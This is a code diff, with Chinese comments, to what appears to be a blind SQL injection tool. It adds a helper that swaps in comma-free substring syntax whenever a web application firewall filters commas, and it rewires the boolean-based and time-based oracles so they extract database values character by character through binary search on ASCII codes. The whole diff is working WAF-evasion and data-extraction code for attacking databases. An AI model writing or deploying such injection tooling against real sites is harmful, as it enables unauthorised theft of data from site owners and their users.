@@ -36,6 +36,12 @@ class BaseOracle:
         """取回标量表达式的字符串值。"""
         raise NotImplementedError
 
+    def _substr_at(self, expr: str, pos: int) -> str:
+        """截取单字符表达式：逗号被滤时用 from/for 免逗号语法。"""
+        if self.waf.is_filtered(","):
+            return f"substr(({expr})from {pos} for 1)"
+        return f"substr(({expr}),{pos},1)"
+
     def scalar_int(self, expr: str) -> int:
         v = self.scalar(expr).strip()
         m = re.search(r"-?\d+", v)
@@ -175,10 +181,12 @@ class BoolOracle(BaseOracle):
         """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。"""
         if prev:
             eq = "=" if not self.waf.is_filtered("=") else " like "
-            if self.eval_bool(f"substr(({expr}),{pos},1){eq}substr(({expr}),{pos-1},1)"):
+            a = self._substr_at(expr, pos)
+            b = self._substr_at(expr, pos - 1)
+            if self.eval_bool(f"{a}{eq}{b}"):
                 return prev
         code = self._binsearch(
-            lambda m: f"ascii(substr(({expr}),{pos},1))>={m}", 32, 126)
+            lambda m: f"ascii({self._substr_at(expr, pos)})>={m}", 32, 126)
         return chr(code)
 
     def _extract_block(self, expr: str, start: int, end: int) -> str:
@@ -360,10 +368,12 @@ class TimeOracle(BaseOracle):
                 raise OracleError("用户中止")
             if prev:
                 eq = "=" if not self.waf.is_filtered("=") else " like "
-                if self.eval_bool(f"substr(({expr}),{p},1){eq}substr(({expr}),{p-1},1)"):
+                a = self._substr_at(expr, p)
+                b = self._substr_at(expr, p - 1)
+                if self.eval_bool(f"{a}{eq}{b}"):
                     out.append(prev)
                     continue
-            code = self._binsearch(lambda m: f"ascii(substr(({expr}),{p},1))>={m}", 32, 126)
+            code = self._binsearch(lambda m: f"ascii({self._substr_at(expr, p)})>={m}", 32, 126)
             ch = chr(code)
             out.append(ch)
             prev = ch or None
